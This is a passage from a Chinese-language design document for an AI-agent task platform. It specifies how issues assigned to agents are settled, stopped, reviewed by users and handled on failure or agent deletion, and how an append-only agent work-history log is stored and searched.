- **运行结束表态**（#258，`IssueService.on_run_ended`，订阅 `RunEnded`：事件带会话来源 `origin` / `origin_ref`，只认 `Origin.ISSUE`）：issue 会话里的一次运行结束（被停止、停在挂起调用上的不算）后，issue 指派给这个 agent 且因此停滞（`rules.stalled`：还是 in_progress、会话空闲）时，以该 agent 的名义记一条 `unsettled` 动态并按投递规则投进它的会话，信里请它表态：做完（in_review / done）、blocked 指派用户，或用会话的等待手段挂起再停（后台任务——如轮询某个条件、满足即退出的检查循环——、`report_back` 的委派、`wake_me` 到点唤醒）。强制表态（`rules.ask_to_settle`，用户 10-28 定）：每次这样停下都问，直到它把状态改离 in_progress（做完、blocked）或让会话等着；只写评论不算表态，会再被问。事件迟到时那次运行的会话已不是它在这个 issue 上的当前会话（被删、换了新的）就不问。与 #107 否决的续跑不同：不重跑原任务，每次只投一封要它改状态的信；靠说明（`SESSION_NOTE` 与信里的一句）让模型改状态，平台不设次数上限。怎么表态写在 issue 会话的来源说明里（`SESSION_NOTE`），信里只多一句「只写评论不算」作提醒。
- **叫停**（`issue_stop(issue_id, status, message?)` → `IssueService.stop`，#272）：叫停被指派 agent 在这个 issue 上的会话。改状态不停会话（用户定：改状态不该有副作用，agent 做完先改状态再留言就会被误杀），所以要停正在做的工作（如已不需要的子 issue）用这个工具。先经端口 `sessions.api.StopSession`（与用户点停止同一条路径：停当前运行、清空信箱、逐层停掉它开出去的 thread）停掉那个会话，返回时停止事务已提交；再在一个事务里记 `stopped` 动态（`{"from": null, "to": 被停的 agent}`）、改状态（`rules.STOP_STATUSES`：backlog / blocked / cancelled / in_progress，停下不是做完，不能 in_review / done）；有 `message` 时记成调用者的评论，连同这几条动态直接投进被停下的会话（`IssueDelivery.deliver_to_in`，不按 `recipient`，不论新状态），让它跑一轮收尾或改方向；没有 message 时按投递规则（停到 backlog 等就不投）。in_progress（打断后改方向）必须带 message。在要停的那个会话里调用报错（改状态用 `issue_update`）；没有 agent 指派人时 `Conflict`；指派人还没有这个会话（或刚被删）时没什么可停，只改状态、记评论，按规则投递，不为收尾新建会话。改成 cancelled 时照常放行下游。
- **交给用户**：agent 把 issue 指派给用户时发 `Notify`（带 `issue_id`，也带它交出 issue 的那个会话），点开是 issue 详情页。
- **审核**（`IssueService.approve` / `reject`，`POST /api/issues/{id}/approve`、`/reject {reason}`，用户的操作，actor 为 `USER`）：只对当前指派给用户、还没结束（不在 `FINISHED`）的 issue（`rules.reviewable`，接口的 `IssueOut.reviewable`），否则 `Conflict`（已经审过、打回、又被改派或取消：连点、两台设备、通知过时都不覆盖别人刚做的事）。通过 = 设为 done（有下游照常放行；收件人是用户，不投信）。打回 = 同一事务里记一条评论（理由，必填）、状态回到 in_progress、指派给把它交给用户的 agent（`rules.handed_by`：最近一条指派动态的 actor，从未改过指派人时是创建者；是用户自己或系统、或这个 agent 已被删除时 `Conflict`，由用户手动指派），三条动态一封信投进它的 issue 会话。界面：`reviewable` 的 issue 详情页上有审核栏（「通过」、理由 +「打回」）；推送通知上的按钮见第 14 节「通知」。
- **先审核再完成**：agent 做完不自己设 done，而是设 in_review 并指派给用户，由用户审核后拖进 done（或在详情页、推送通知上「通过」；「打回」见上文「审核」）。例外：有别的 issue 依赖它（`issue_show` 的 `blocks` 非空，典型是大需求拆出的子 issue）时，做完由 agent 自己设 done，放行下游；拆法是一次 `issue_create(issues=[子..., 父])`：子 issue 与父 issue（总目标与验收，依赖全部子 issue）都建成 in_progress、之间用 key 依赖排序（在等上游的不投递、不算停滞）；整批提交后才投递，子 issue 开工时 `blocks` 已包含父 issue。约定做完时仍再 `issue_show` 一次看 `blocks`（下游也可能事后才加）。全部子 issue 完成后父 issue 才投递，集成验收后照常 in_review 交给用户（拆分步骤见公共 skill `issue-breakdown`）。这些是约定，写在 issue 会话的来源说明（`sessions.origins` 的 ISSUE）和 `issue_create`/`issue_update` 的工具说明里，代码不拦。
- **删除 agent**：订阅 `AgentDeleting`，指派给它、归它负责的 issue 改为未指派、无负责人（各记一条时间线，actor 是系统 `rules.SYSTEM_ACTOR`（`"system"`），不是用户；同时更新 `updated_at`）。它的 issue 会话随它由会话领域删除，issue 领域没有要清理的会话引用。
- **运行失败**：会话领域在运行最终失败的事务里（`RunHandler.failed_in`：暂时性失败的重试用完，或契约外的失败；还在等重试的不算）发布 `RunFailed`（会话、agent、运行、会话来源与 `origin_ref`、错误原文），issue 领域订阅它、只认 `Origin.ISSUE` 的会话（按会话来源认领，不读 tasks 表）：在该 issue 时间线上记一条 `run_failed` 动态（actor 是失败的那个 agent，body 是 `RunFailed.summary` 截断到 500 字的错误摘要），更新 `updated_at`。通知用户不在这里：通知领域对所有列出的会话统一发（第 14 节「通知」），点开是那个 issue 会话。这条动态不投递、不改状态：投进会话就等于自动重试，永久性错误会陷入循环；之后有人评论或改动时照常投递、唤醒 agent。issue 已被删除时只记日志。`failed_in` 自己失败（worker 不带钩子记下失败）时不发，失败仍在任务页与日志里可见。

## 22. 工作历史

**职责**：记下每个 agent 做过的事，供以后回答「做过什么、什么时候、为什么」（`history/`，表 `agent_history`）。记忆与 skill 是规则，历史只是事实，不约束做法。

- **写入**：agent 自己用 `history_append(entries)` 写（工具总是开放，与记忆、skill 一起，只能写自己的），一件事一条：`day`（工作发生的日历日，按配置的 `timezone`，不能晚于今天）、标题（≤200 字）、摘要、`refs`（字符串列表）、`importance`（1 一般、2 重要、3 很重要）。一次调用的条目全部合法才写入。何时写、怎么写是约定：每日 self-evolve 第一步总结前一天，先 `history_search` 查那天写过没有（公共 skill `self-evolve`），平台不拦重复。
- **只追加**：迁移建出触发器，`UPDATE` / `DELETE` 直接 `RAISE(ABORT)`；没有改、删的工具或接口。删除 agent 不清理它的历史（同用量，`agent_id` 是不透明的 id；工具 `history_search(agent=all)` 里显示为已删除的 agent，界面只在 agent 详情页展示，删掉后看不到）。以后 batch 重建这张表的迁移必须重建这些触发器。
- **检索**（`HistoryLog.search`，工具 `history_search`、`GET /api/agents/{id}/history`）：按 agent（工具默认自己，可给名字或 `all`）、日期范围（含两端）、最低重要程度过滤。没给 query 按日期倒序；给了按空白切词、每个词都要出现在标题、摘要或引用里：词都不短于 3 个字符时走 FTS5（`tokenize='trigram'`，中文可用）按 bm25 排序（trigram 要求 SQLite ≥ 3.34，部署环境 3.53），有更短的词（trigram 匹配不了）就逐词 `LIKE`、按日期倒序。不做 embedding：语义问题由 agent 按时间捞出一段再自己判断。
- **FTS 虚表**不在 ORM 的 metadata 里：`history.tables` 把它登记进 `platform.db.UNMANAGED_TABLES`，Alembic 比对结构（`env.py`、迁移测试）用 `include_name` 跳过它与影子表；插入时由 AFTER INSERT 触发器同步（行不改不删，只需要这一个），引用索引的是 JSON 解码后的值，LIKE 分支同样经 `json_each` 匹配值，不匹配 JSON 原文。
- **界面**：agent 详情页「历史」标签，按日期分组列出，可按关键词搜索（搜索结果按相关度平铺，每条标日期）（`web/src/pages/History.tsx`）。

## 23. 暂缓的项

- **自己写 agent loop**（框架只做模型客户端）：改动限于 `agent_runtime` 的运行端口（第 2.1 节）。
